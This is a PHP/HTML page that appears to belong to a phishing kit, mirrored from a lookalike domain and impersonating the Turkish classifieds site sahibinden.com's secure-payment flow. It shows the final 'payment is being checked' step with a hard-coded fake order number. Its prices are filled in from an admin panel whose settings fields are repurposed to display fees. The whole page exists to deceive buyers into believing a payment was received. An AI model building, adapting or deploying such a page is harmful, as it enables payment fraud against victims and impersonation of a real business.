<?php include 'yonetim/islemler/baglan.php';


$sorgu=$db->prepare("SELECT * FROM sayfalar");
$sorgu->execute();
$sayfa=$sorgu->fetch(PDO::FETCH_ASSOC); ?>
<!DOCTYPE html>
<html class="" lang="tr">
  
<!-- Mirrored from sahibinden-get.shop/index.php?q=oneplus-8-pro by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 25 Jan 2022 18:11:20 GMT -->
<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
<head>
    <style type="text/css">
      
    </style>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
    <meta name="referrer" content="no-referrer-when-downgrade">
    <meta id="Content-Language" http-equiv="Content-Language" content="tr">
    <meta name="rating" content="general">
    <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
    <meta name="revisit-after" content="1 Days">
    <link rel="shortcut icon" href="assets/css/favicon.ico" type="image/x-icon">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
    <title>sahibinden.com - Satılık, Kiralık, 2. El, Emlak, Oto, Araba, Bilgisayar, Film, Cep Telefonu, Elektronik, Antika, Giyim, Mobilya, Eleman Arayanlar ve daha fazlası - İlan ve alışverişte ilk adres</title>
    <link href="assets/css/common.css" media="screen, print" rel="stylesheet" type="text/css">
    <link href="assets/css/payment.css" media="screen, print" rel="stylesheet" type="text/css">
  </head>
  <body class="type-individual ios">
    <div class="header-banners clearfix">
      <div class="mast-head-banner">
    </div>
    <div class="header-container without-background">
      <div class="header secure-payment">
        <p class="clearfix">
          <a class="logo" href="https://www.sahibinden.com/" title="sahibinden.com anasayfasına dön" style="pointer-events: none;"> sahibinden.com anasayfasına dön</a>
        </p>
        <h1>Ödeme Bilgileri</h1>
      </div>
    </div>
    <div id="container">
      <link href="assets/css/dialog.css" type="text/css" rel="stylesheet">
      <div id="slsDialogFe" class="safe ng-scope">
        <div ng-include="'/views/myAccount/common/RenewSls/RenewSls.html'" class="ng-scope">
          <style class="ng-scope">

          </style>
        </div>
      </div>
      <div class="set-payment-container set-payment-active-step-4">
        <div class="payment-progress">
          <div class="bar"></div>
          <ul>
            <!-- .step-0 is a fake -->
            <li class="step-0"></li>
            <li class="step-1">
              <strong>1</strong>
              <span>Ürün</span>
              <span class="responsive-part">Ürün</span>
            </li>
            <li class="step-2">
              <strong>2</strong>
              <span>Adres</span>
              <span class="responsive-part">Adres</span>
            </li>
            <li class="step-3">
              <strong>3</strong>
              <span>Ödeme</span>
              <span class="responsive-part">Ödeme</span>
            </li>
            <li class="step-4">
              <strong>4</strong>
              <span class="last">Ödeme Alındı</span>
              <span class="responsive-part">Ödeme Alındı</span>
            </li>
          </ul>
        </div>
        <form action="#" method="POST" autocomplete="off">
            <div class="set-payment-step-4-detail">
                <div class="responsive-part classified-info-part">
                  <div class="image-part">
                    <img src="yonetim/dosyalar/<?php echo $ayarcek['site_logo'] ?>" height="75" width="100" alt="">
                    <div class="favorite">
                      <h4><?php echo $ayarcek['site_baslik'] ?></h4>
                    </div>
                  </div>
                  <div class="prices">
                    <div class="row first">
                      <span class="total-price-area right first total-price item-total-price small-currency price-format-renew"><?php echo $ayarcek['site_aciklama'] ?></span>
                        <span class="sum-label"></span>
                      </span>
                      <div class="left first numeric-input-holder prev-disabled next-disabled disable"></div>
                    </div>
                    <div class="seperator"></div>
                    <div class="row">
                      <span class="paris-fee-area right total-price item-total-price small-currency price-format-renew"><?php echo $ayarcek['twitter'] ?></span>
                        <span class="sum-label"></span>
                      </span>
                      <p class="left">S - Param Güvende Hizmet Bedeli</p>
                    </div>
                    <div class="seperator"></div>
                    <div class="row">
                      <span class="paris-total-price-area right total-price small-currency price-format-renew"><?php echo $ayarcek['site_anasayfa_aciklama'] ?></span>
                        <span class="sum-label"></span>
                      </span>
                      <p class="left total">Toplam</p>
                    </div>
                  </div>
                </div>
                <div class="responsive-part cargo-info">
                  <p> Satıcı&nbsp;3&nbsp;iş günü içinde kargolar.</p>
                </div>
<div class="left-box">
                  <div class="sub-left-box credit-card-box">
                <div class="address-header">
                    <h3>ÖDEMENİZ KONTROL EDİLİYOR</h3>
                </div>
                    <div class="box-verify">
                        <div class="flex2">
                            <i class="fas fa-check-circle"></i>
                            <p>Siparişiniz alındı</p>                            
                        </div>
                        <div class="flex2">
                        <i class="fas fa-exclamation-circle"></i>
                        <p style="font-weight: 900; margin: unset; margin-left: 15px;font-size: 16px;">Ödemeniz onaylandıktan sonra siparişiniz onaylanacaktır.</p>
                        </div>
                        <div class="texts">
                            <p>Siparişiniz onaylandıktan sonra kargoya verildiğinde SMS ile sizi bilgilendireceğiz.</p>
                            <nav class="details">
                                <span>Sipariş Numarası:</span>
                                <span>1211232</span>
                            </nav>
                        </div>
                    </div>
                </div>
                          
    <script>
    </script>
  </body>
</html>